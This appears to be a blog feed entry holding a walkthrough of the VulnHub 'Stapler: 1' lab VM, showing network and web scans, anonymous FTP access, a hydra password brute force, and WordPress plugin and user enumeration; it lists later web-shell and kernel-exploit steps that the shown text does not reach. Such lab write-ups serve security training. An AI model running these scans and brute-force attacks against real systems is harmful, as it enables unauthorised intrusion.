<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: stapler | F4l13n5n0w]]></title>
  <link href="http://f4l13n5n0w.github.io/blog/categories/stapler/atom.xml" rel="self"/>
  <link href="http://f4l13n5n0w.github.io/"/>
  <updated>2020-02-29T10:37:53+11:00</updated>
  <id>http://f4l13n5n0w.github.io/</id>
  <author>
    <name><![CDATA[F4l13n5n0w]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[[VulnHub] Stapler: 1]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2016/08/15/vulnhub-stapler-1/"/>
    <updated>2016-08-15T21:21:02+10:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2016/08/15/vulnhub-stapler-1</id>
    <content type="html"><![CDATA[<p>This is made for BsidesLondon 2016 with average beginner/intermediate difficulty and a few twists :) Also multiple attacking vectors and paths to get shell and ROOT. Author is <a href="https://www.vulnhub.com/author/g0tmi1k,21/">g0tmi1k</a></p>

<p>More information and OVA file download please check <a href="https://www.vulnhub.com/entry/stapler-1,150/">here</a>.</p>

<!-- more -->


<h2>Attacker &amp; Target</h2>

<p>Attacker: Kali2 Linux (<em>10.1.1.132/24</em>)</p>

<p>Target: Stapler: 1 (<em>10.1.1.138/24</em>)</p>

<h2>Vulnerability &amp; Exploit</h2>

<ul>
<li>FTP service allow Anonymous login</li>
<li><code>WordPress</code> username and password bruteforce attack</li>
<li>WEB application Full Path Disclosure</li>
<li><a href="https://www.exploit-db.com/exploits/39646/" title="WordPress Advanced Video Plugin 1.0 - Local File Inclusion">WordPress Advanced Video Plugin 1.0 - Local File Inclusion</a></li>
<li><a href="https://www.exploit-db.com/exploits/39772/" title="Linux Kernel 4.4.x (Ubuntu 16.04) - 'double-fdput()' in bpf(BPF_PROG_LOAD) Local Root Exploit">Linux Kernel 4.4.x (Ubuntu 16.04) - &lsquo;double-fdput()&rsquo; in bpf(BPF_PROG_LOAD) Local Root Exploit</a></li>
</ul>


<h2>Method</h2>

<ul>
<li>Scanned the network to discover the target server [<font color="FF8000">arp-scan</font>]</li>
<li>Port scanned the target to discover running services and open ports [<font color="FF8000">masscan</font> &amp;&amp; <font color="FF8000">nmap</font>]</li>
<li>Web application scanned to dig more information about web service [<font color="FF8000">nikto</font>]</li>
<li>Scan specific vulnerability for WordPress CMS [<font color="FF8000">wpscan</font>]</li>
<li>Exploit WordPress plugin LFI vulnerability to read sensitive informtion</li>
<li>Connect to target server&rsquo;s MySQL service as root and write reverse PHP web shell</li>
<li>Connect to target server&rsquo;s MySQL service and download <code>wp_users</code> table which username and password hash saved in</li>
<li>Crack WordPress administrator/editor account and login to upload webshell [<font color="FF8000">php-reverse-shell</font>]</li>
<li>Enumeration and exploit the local priviledge vulnerability to get ROOT</li>
</ul>


<h2>Tools</h2>

<p>All the tools used here can be found in Kali Linux</p>

<ul>
<li><a href="http://linux.die.net/man/1/arp-scan">arp-scan</a></li>
<li><a href="https://github.com/robertdavidgraham/masscan">masscan</a></li>
<li><a href="https://nmap.org/">nmap</a></li>
<li><a href="https://cirt.net/Nikto2">nikto</a></li>
<li><a href="https://wpscan.org/">wpscan</a></li>
<li><a href="http://sqlmap.org/">sqlmap</a></li>
<li><a href="http://linux.die.net/man/1/nc">nc</a></li>
<li><a href="https://www.mozilla.org/en-US/firefox/new/">firefox</a></li>
<li><a href="https://portswigger.net/burp/">burp suite</a></li>
<li><a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">php-reverse-shell</a></li>
</ul>


<h2>Walkthrough</h2>

<p>Using <code>arp-scan</code> as routine to detect the target&rsquo;s IP address.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/stapler# arp-scan -l
</span><span class='line'>Interface: eth0, datalink <span class="nb">type</span>: EN10MB <span class="o">(</span>Ethernet<span class="o">)</span>
</span><span class='line'>Starting arp-scan 1.9 with <span class="m">256</span> hosts <span class="o">(</span>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://www.nta-monitor.com/tools/arp-scan/&quot;</span>&gt;http://www.nta-monitor.com/tools/arp-scan/&lt;/a&gt;<span class="o">)</span>
</span><span class='line'>10.1.1.1    00:50:56:c0:00:08   VMware, Inc.
</span><span class='line'>10.1.1.2    00:50:56:f1:61:7e   VMware, Inc.
</span><span class='line'>10.1.1.138  00:0c:29:b4:04:59   VMware, Inc.
</span><span class='line'>10.1.1.254  00:50:56:e8:0a:52   VMware, Inc.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;4 packets received by filter, <span class="m">0</span> packets dropped by kernel
</span><span class='line'>Ending arp-scan 1.9: <span class="m">256</span> hosts scanned in 2.283 seconds <span class="o">(</span>112.13 hosts/sec<span class="o">)</span>. <span class="m">4</span> responded
</span></code></pre></td></tr></table></div></figure></p>

<p><code>10.1.1.138</code> is our Target!</p>

<p>Then run <code>masscan</code> to detect opening ports on the target (masscan is much faster than nmap when doing a full ports scan, so here I use it to make a full scan and then use nmap to do a deep scan on target ports).</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/stapler# masscan -p1-65535 10.1.1.138/32 <span class="p">&amp;</span>ndash<span class="p">;</span><span class="nv">rate</span><span class="o">=</span><span class="m">10000</span> <span class="p">|</span> cut -d <span class="p">&amp;</span>lsquo<span class="p">;</span> <span class="p">&amp;</span>rsquo<span class="p">;</span> -f <span class="m">4</span> <span class="p">|</span> cut -d <span class="p">&amp;</span>lsquo<span class="p">;</span>/<span class="p">&amp;</span>rsquo<span class="p">;</span> -f <span class="m">1</span> <span class="p">|</span> tee 138_masscan.txt&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Starting masscan 1.0.3 <span class="o">(</span>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://bit.ly/14GZzcT&quot;</span>&gt;http://bit.ly/14GZzcT&lt;/a&gt;<span class="o">)</span> at 2016-08-12 11:19:28 GMT
</span><span class='line'> <span class="p">&amp;</span>ndash<span class="p">;</span> forced options: -sS -Pn -n <span class="p">&amp;</span>ndash<span class="p">;</span>randomize-hosts -v <span class="p">&amp;</span>ndash<span class="p">;</span>send-eth
</span><span class='line'>Initiating SYN Stealth Scan
</span><span class='line'>Scanning <span class="m">1</span> hosts <span class="o">[</span><span class="m">65535</span> ports/host<span class="o">]</span>
</span><span class='line'><span class="m">12380</span>                                                                      &lt;br/&gt;
</span><span class='line'>22
</span><span class='line'>21
</span><span class='line'>53
</span><span class='line'>3306
</span><span class='line'>666
</span><span class='line'>80&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;root@kali:~/myExercises/stapler# tr <span class="p">&amp;</span>lsquo<span class="p">;</span><span class="se">\n</span><span class="p">&amp;</span>rsquo<span class="p">;</span> <span class="p">&amp;</span>lsquo<span class="p">;</span>,<span class="p">&amp;</span>rsquo<span class="p">;</span> <span class="p">&amp;</span>lt<span class="p">;</span> 138_masscan.txt
</span><span class='line'>12380,22,21,53,3306,666,80,root@kali:~/myExercises/stapler#   &lt;br/&gt;
</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="p">&amp;</span>hellip<span class="p">;</span>truncated<span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'>Nmap scan report <span class="k">for</span> 10.1.1.138
</span><span class='line'>Host is up <span class="o">(</span>0.00044s latency<span class="o">)</span>.
</span><span class='line'>PORT      STATE SERVICE VERSION
</span><span class='line'>21/tcp    open  ftp     vsftpd 2.0.8 or later
</span><span class='line'><span class="p">|</span> ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code 230<span class="o">)</span>
</span><span class='line'><span class="p">|</span>&lt;em&gt;Can<span class="p">&amp;</span>rsquo<span class="p">;</span>t get directory listing: Can<span class="p">&amp;</span>rsquo<span class="p">;</span>t parse PASV response: <span class="p">&amp;</span>ldquo<span class="p">;</span>Permission denied.<span class="p">&amp;</span>rdquo<span class="p">;</span>
</span><span class='line'>22/tcp    open  ssh     OpenSSH 7.2p2 Ubuntu <span class="m">4</span> <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
</span><span class='line'><span class="p">|</span> ssh-hostkey:
</span><span class='line'><span class="p">|</span>   <span class="m">2048</span> 81:21:ce:a1:1a:05:b1:69:4f:4d:ed:80:28:e8:99:05 <span class="o">(</span>RSA<span class="o">)</span>
</span><span class='line'><span class="p">|</span>&lt;/em&gt;  <span class="m">256</span> 5b:a5:bb:67:91:1a:51:c2:d3:21:da:c0:ca:f0:db:9e <span class="o">(</span>ECDSA<span class="o">)</span>
</span><span class='line'>53/tcp    open  domain  dnsmasq 2.75
</span><span class='line'><span class="p">|</span> dns-nsid:
</span><span class='line'><span class="p">|</span>&lt;em&gt;  bind.version: dnsmasq-2.75
</span><span class='line'>80/tcp    open  http
</span><span class='line'><span class="p">|</span> http-methods:
</span><span class='line'><span class="p">|</span>&lt;/em&gt;  Supported Methods: GET HEAD POST OPTIONS
</span><span class='line'><span class="p">|</span>&lt;em&gt;http-title: <span class="m">404</span> Not Found
</span><span class='line'>666/tcp   open  doom?
</span><span class='line'>3306/tcp  open  mysql   MySQL 5.7.13-0ubuntu0.16.04.2
</span><span class='line'><span class="p">|</span> mysql-info:
</span><span class='line'><span class="p">|</span>   Protocol: 53
</span><span class='line'><span class="p">|</span>   Version: .7.13-0ubuntu0.16.04.2
</span><span class='line'><span class="p">|</span>   Thread ID: 8440
</span><span class='line'><span class="p">|</span>   Capabilities flags: 63487
</span><span class='line'><span class="p">|</span>   Some Capabilities: LongPassword, SupportsTransactions, IgnoreSigpipes, ConnectWithDatabase, DontAllowDatabaseTableColumn, Speaks41ProtocolOld, Support41Auth, ODBCClient, InteractiveClient, SupportsLoadDataLocal, IgnoreSpaceBeforeParenthesis, Speaks41ProtocolNew, LongColumnFlag, SupportsCompression, FoundRows
</span><span class='line'><span class="p">|</span>   Status: Autocommit
</span><span class='line'><span class="p">|</span>&lt;/em&gt;  Salt: <span class="p">&amp;</span>lsquo<span class="p">;</span>pw<span class="p">|</span><span class="o">)</span><span class="se">\x</span>07ib<span class="se">\x</span>0ByIS3P<span class="p">&amp;</span>lt<span class="p">;</span>Y&lt;sup&gt;jO&lt;/sup&gt;<span class="se">\x</span>10
</span><span class='line'>12380/tcp open  http    Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
</span><span class='line'><span class="p">|</span> http-methods:
</span><span class='line'><span class="p">|</span>&lt;em&gt;  Supported Methods: GET HEAD POST OPTIONS
</span><span class='line'><span class="p">|</span>&lt;/em&gt;http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
</span><span class='line'><span class="p">|</span>_http-title: Site doesn<span class="p">&amp;</span>rsquo<span class="p">;</span>t have a title <span class="o">(</span>text/html<span class="o">)</span>.
</span><span class='line'><span class="p">&amp;</span>hellip<span class="p">;</span>truncated<span class="p">&amp;</span>hellip<span class="p">;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Based on the result of NMAP scan, firstly, I found FTP port 21 is open and Anonymous login allowed. So I connected to the FTP server and found a file <code>note</code>:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/stapler# ftp 10.1.1.138
</span><span class='line'>Connected to 10.1.1.138.
</span><span class='line'>220-
</span><span class='line'>220-<span class="p">|&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;|</span>
</span><span class='line'>220-<span class="p">|</span> Harry, make sure to update the banner when you get a chance to show who has access here <span class="p">|</span>
</span><span class='line'>220-<span class="p">|&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;|</span>
</span><span class='line'>220-
</span><span class='line'>220
</span><span class='line'>Name <span class="o">(</span>10.1.1.138:root<span class="o">)</span>: anonymous
</span><span class='line'><span class="m">331</span> Please specify the password.
</span><span class='line'>Password:
</span><span class='line'><span class="m">230</span> Login successful.
</span><span class='line'>Remote system <span class="nb">type </span>is UNIX.
</span><span class='line'>Using binary mode to transfer files.
</span><span class='line'>ftp&gt;
</span><span class='line'>ftp&gt; ls
</span><span class='line'><span class="m">200</span> PORT <span class="nb">command </span>successful. Consider using PASV.
</span><span class='line'><span class="m">150</span> Here comes the directory listing.
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span>    <span class="m">1</span> <span class="m">0</span>        <span class="m">0</span>             <span class="m">107</span> Jun <span class="m">03</span> 23:06 note
</span><span class='line'><span class="m">226</span> Directory send OK.
</span><span class='line'>ftp&gt; get note
</span><span class='line'><span class="nb">local</span>: note remote: note
</span><span class='line'><span class="m">200</span> PORT <span class="nb">command </span>successful. Consider using PASV.
</span><span class='line'><span class="m">150</span> Opening BINARY mode data connection <span class="k">for</span> note <span class="o">(</span><span class="m">107</span> bytes<span class="o">)</span>.
</span><span class='line'><span class="m">226</span> Transfer complete.
</span><span class='line'><span class="m">107</span> bytes received in 0.01 secs <span class="o">(</span>14.1935 kB/s<span class="o">)</span>
</span><span class='line'>ftp&gt;&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;root@kali:~/myExercises/stapler# cat note
</span><span class='line'>Elly, make sure you update the payload information. Leave it in your FTP account once your are <span class="k">done</span>, John.
</span><span class='line'>root@kali:~/myExercises/stapler#
</span></code></pre></td></tr></table></div></figure></p>

<p>From the <code>note</code> file, I know that <code>elly</code> is a ftp user and there could be something about payload stored in her FTP folder.</p>

<p>Then I did a quick FTP login brute force attack against to user <code>elly</code> by using <code>hydra</code> with parameter <code>-e nsr</code>.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/stapler# hydra -l elly -e nsr &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;ftp://10.1.1.138&quot;</span>&gt;ftp://10.1.1.138&lt;/a&gt;
</span><span class='line'>Hydra v8.2 <span class="p">&amp;</span>copy<span class="p">;</span> <span class="m">2016</span> by van Hauser/THC - Please <span class="k">do</span> not use in military or secret service organizations, or <span class="k">for</span> illegal purposes.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Hydra <span class="o">(</span>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://www.thc.org/thc-hydra&quot;</span>&gt;http://www.thc.org/thc-hydra&lt;/a&gt;<span class="o">)</span> starting at 2016-08-15 22:56:07
</span><span class='line'><span class="o">[</span>DATA<span class="o">]</span> max <span class="m">3</span> tasks per <span class="m">1</span> server, overall <span class="m">64</span> tasks, <span class="m">3</span> login tries <span class="o">(</span>l:1/p:3<span class="o">)</span>, ~0 tries per task
</span><span class='line'><span class="o">[</span>DATA<span class="o">]</span> attacking service ftp on port 21
</span><span class='line'><span class="o">[</span>21<span class="o">][</span>ftp<span class="o">]</span> host: 10.1.1.138   login: elly   password: ylle
</span><span class='line'><span class="m">1</span> of <span class="m">1</span> target successfully completed, <span class="m">1</span> valid password found
</span><span class='line'>Hydra <span class="o">(</span>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://www.thc.org/thc-hydra&quot;</span>&gt;http://www.thc.org/thc-hydra&lt;/a&gt;<span class="o">)</span> finished at 2016-08-15 22:56:11
</span></code></pre></td></tr></table></div></figure></p>

<p>Great! <code>elly</code>&rsquo;s password is <font color="red"><code>ylle</code></font></p>

<p>Login as <code>elly</code> and found that the home directory is <code>/etc/</code>, so I downloaded the file <code>passwd</code> and <code>vsftpd.conf</code>.</p>

<p>So far, nothing else found, so I decided to move on.</p>

<p>port 12380 is open and running HTTP with SSL. so I did a <code>nikto</code> scan against port 12380</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>- Nikto v2.1.6/2.1.5
</span><span class='line'>+ Target Host: 10.1.1.138
</span><span class='line'>+ Target Port: 12380
</span><span class='line'>+ GET Server leaks inodes via ETags, header found with file /, fields: 0x15 0x5347c53a972d1
</span><span class='line'>+ GET The anti-clickjacking X-Frame-Options header is not present.
</span><span class='line'>+ GET The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
</span><span class='line'>+ GET Uncommon header <span class="p">&amp;</span>lsquo<span class="p">;</span>dave<span class="p">&amp;</span>rsquo<span class="p">;</span> found, with contents: Soemthing doesn<span class="p">&amp;</span>rsquo<span class="p">;</span>t look right here
</span><span class='line'>+ GET The site uses SSL and the Strict-Transport-Security HTTP header is not defined.
</span><span class='line'>+ GET The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME <span class="nb">type</span>
</span><span class='line'>+ GET Entry <span class="p">&amp;</span>lsquo<span class="p">;</span>/admin112233/<span class="p">&amp;</span>rsquo<span class="p">;</span> in robots.txt returned a non-forbidden or redirect HTTP code <span class="o">(</span>200<span class="o">)</span>
</span><span class='line'>+ GET Entry <span class="p">&amp;</span>lsquo<span class="p">;</span>/blogblog/<span class="p">&amp;</span>rsquo<span class="p">;</span> in robots.txt returned a non-forbidden or redirect HTTP code <span class="o">(</span>200<span class="o">)</span>
</span><span class='line'>+ GET <span class="p">&amp;</span>ldquo<span class="p">;</span>robots.txt<span class="p">&amp;</span>rdquo<span class="p">;</span> contains <span class="m">2</span> entries which should be manually viewed.
</span><span class='line'>+ OPTIONS Allowed HTTP Methods: GET, HEAD, POST, OPTIONS
</span><span class='line'>+ GET Uncommon header <span class="p">&amp;</span>lsquo<span class="p">;</span>x-ob_mode<span class="p">&amp;</span>rsquo<span class="p">;</span> found, with contents: 1
</span><span class='line'>+ OSVDB-3233: GET /icons/README: Apache default file found.
</span><span class='line'>+ GET /phpmyadmin/: phpMyAdmin directory found
</span></code></pre></td></tr></table></div></figure></p>

<p>From the nikto scan, we found that WEB server on port 12380 is a HTTPS service and there are three hidden directories <code>/admin112233</code>, <code>/blogblog</code> and <code>/phpmyadmin</code>.</p>

<p>so I checked them one by one, and 1st one is <code>/admin112233</code>, but this is a XSS hook page :(</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/stapler# curl -k &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;https://10.1.1.138:12380/admin112233/&quot;</span>&gt;https://10.1.1.138:12380/admin112233/&lt;/a&gt;
</span><span class='line'>&lt;html&gt;
</span><span class='line'>&lt;head&gt;
</span><span class='line'>&lt;title&gt;mwwhahahah&lt;/title&gt;
</span><span class='line'>&lt;body&gt;
</span><span class='line'>&lt;noscript&gt;Give yourself a cookie! Javascript didn<span class="p">&amp;</span>rsquo<span class="p">;</span>t <span class="nv">run</span> <span class="o">=)</span>&lt;/noscript&gt;&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;script <span class="nb">type</span><span class="o">=</span><span class="s2">&quot;text/javascript&quot;</span>&gt;window.alert<span class="o">(</span><span class="s2">&quot;This could of been a BeEF-XSS hook ;)&quot;</span><span class="o">)</span><span class="p">;</span>window.location<span class="o">=</span><span class="s2">&quot;http://www.xss-payloads.com/&quot;</span><span class="p">;</span>&lt;/script&gt;
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>&lt;p&gt;&lt;/body&gt;
</span><span class='line'>&lt;/html&gt;
</span></code></pre></td></tr></table></div></figure></p>

<p>2nd one is <code>/blogblog</code>, and it&rsquo;s using <code>WordPress CMS</code>.</p>

<p>so next, I run <code>wpscan</code> and found one plugin which is vulnerable to <a href="https://www.exploit-db.com/exploits/39646/" title="WordPress Advanced Video Plugin 1.0 - Local File Inclusion">WordPress Advanced Video Plugin 1.0 - Local File Inclusion</a></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="p">&amp;</span>hellip<span class="p">;</span>truncated<span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> We found <span class="m">4</span> plugins:&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="o">[</span>+<span class="o">]</span> Name: advanced-video-embed-embed-videos-or-playlists - v1.0
</span><span class='line'> <span class="p">|</span>  Latest version: 1.0 <span class="o">(</span>up to date<span class="o">)</span>
</span><span class='line'> <span class="p">|</span>  Location: &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;https://10.1.1.138:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/&quot;</span>&gt;https://10.1.1.138:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/&lt;/a&gt;
</span><span class='line'> <span class="p">|</span>  Readme: &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;https://10.1.1.138:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/readme.txt&quot;</span>&gt;https://10.1.1.138:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/readme.txt&lt;/a&gt;
</span><span class='line'><span class="o">[</span>!<span class="o">]</span> Directory listing is enabled: &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;https://10.1.1.138:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/&quot;</span>&gt;https://10.1.1.138:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/&lt;/a&gt;
</span><span class='line'><span class="p">&amp;</span>hellip<span class="p">;</span>truncated<span class="p">&amp;</span>hellip<span class="p">;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Also I use <code>wpscan</code> to enumerate available users and got the following result:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>+<span class="p">&amp;</span>mdash<span class="p">;</span>-+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;</span>+
</span><span class='line'>    <span class="p">|</span> Id <span class="p">|</span> Login   <span class="p">|</span> Name            <span class="p">|</span>
</span><span class='line'>    +<span class="p">&amp;</span>mdash<span class="p">;</span>-+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;</span>+
</span><span class='line'>    <span class="p">|</span> <span class="m">1</span>  <span class="p">|</span> john    <span class="p">|</span> John Smith      <span class="p">|</span>
</span><span class='line'>    <span class="p">|</span> <span class="m">2</span>  <span class="p">|</span> elly    <span class="p">|</span> Elly Jones      <span class="p">|</span>
